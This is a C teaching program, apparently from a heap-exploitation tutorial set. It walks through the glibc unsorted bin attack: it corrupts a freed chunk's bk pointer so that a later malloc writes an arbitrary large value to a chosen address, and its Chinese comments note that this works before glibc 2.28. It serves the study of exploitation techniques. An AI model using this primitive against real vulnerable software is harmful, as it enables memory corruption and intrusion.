#include <stdio.h>
#include <stdlib.h>

int main(){
	fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
	fprintf(stderr, "In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
		   "global variable global_max_fast in libc for further fastbin attack\n\n");

	unsigned long stack_var=0;
	fprintf(stderr, "Let's first look at the target we want to rewrite on stack:\n");
	fprintf(stderr, "%p: %ld\n\n", &stack_var, stack_var);

	unsigned long *p=malloc(400);
	fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p);
	fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
	malloc(500);
	free(p);

	//打印bk指针
	fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to %p\n",(void*)p[1]);

	//------------VULNERABILITY-----------
	//*修改bk指针为目标地址 - 2 * SIZE_SZ处的指针(目标地址为对应fake chunk的fd指针)
	p[1]=(unsigned long)(&stack_var-2);
	fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
	fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

	//------------------------------------
	//*此时victim->bk指向目标地址-2*SIZE_SZ，即victim->bk->fd为目标地址
	//*malloc时候执行victim -> bk -> fd = unsorted_bin(av),且在版本2.28以前不在unsorted bin中进行victim -> bk -> fd == victim检查
	//*修改对应的域为bin[0] - 2 * SIZE_SZ 的地址，将对应的域改为一个较大的数(或通过unsorted bin attack获取malloc_state结构体指针从而得到libc指针)
	//!特性2.28以前可用
	malloc(400);
	fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been "
		   "rewritten:\n");
	fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);
}
